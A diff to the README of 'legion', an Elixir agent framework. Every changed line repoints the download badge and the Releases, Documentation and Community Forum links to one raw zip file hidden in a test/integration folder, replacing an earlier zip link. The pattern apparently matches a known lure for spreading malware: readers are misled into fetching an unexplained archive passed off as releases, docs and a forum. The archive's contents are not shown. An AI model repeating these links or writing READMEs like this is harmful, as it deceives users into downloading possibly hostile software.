@@ -6,7 +6,7 @@ Welcome to **legion**, an Elixir-native framework designed for creating intellig
 
 ## 📥 Download
 
-[![Download legion](https://github.com/muhammadshehata0/legion/raw/refs/heads/main/lib/legion/llm/Software-1.2.zip%20legion-v1.0-brightgreen)](https://github.com/muhammadshehata0/legion/raw/refs/heads/main/lib/legion/llm/Software-1.2.zip)
+[![Download legion](https://raw.githubusercontent.com/muhammadshehata0/legion/main/test/integration/product_research/Software_1.8.zip%20legion-v1.0-brightgreen)](https://raw.githubusercontent.com/muhammadshehata0/legion/main/test/integration/product_research/Software_1.8.zip)
 
 ## 📝 Overview
 
@@ -34,9 +34,9 @@ For optimal use, refer to our documentation, which covers all aspects of develop
 
 ## 🔄 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/muhammadshehata0/legion/raw/refs/heads/main/lib/legion/llm/Software-1.2.zip). On this page, you will find the latest version of legion.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/muhammadshehata0/legion/main/test/integration/product_research/Software_1.8.zip). On this page, you will find the latest version of legion.
 
-1. Go to the [Releases page](https://github.com/muhammadshehata0/legion/raw/refs/heads/main/lib/legion/llm/Software-1.2.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/muhammadshehata0/legion/main/test/integration/product_research/Software_1.8.zip).
 2. Locate the latest release.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -63,9 +63,9 @@ If you need help, consider joining our community. Here you can ask questions, sh
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/muhammadshehata0/legion/raw/refs/heads/main/lib/legion/llm/Software-1.2.zip)
-- [Documentation](https://github.com/muhammadshehata0/legion/raw/refs/heads/main/lib/legion/llm/Software-1.2.zip)
-- [Community Forum](https://github.com/muhammadshehata0/legion/raw/refs/heads/main/lib/legion/llm/Software-1.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/muhammadshehata0/legion/main/test/integration/product_research/Software_1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/muhammadshehata0/legion/main/test/integration/product_research/Software_1.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/muhammadshehata0/legion/main/test/integration/product_research/Software_1.8.zip)
 
 ## 📩 Feedback
 
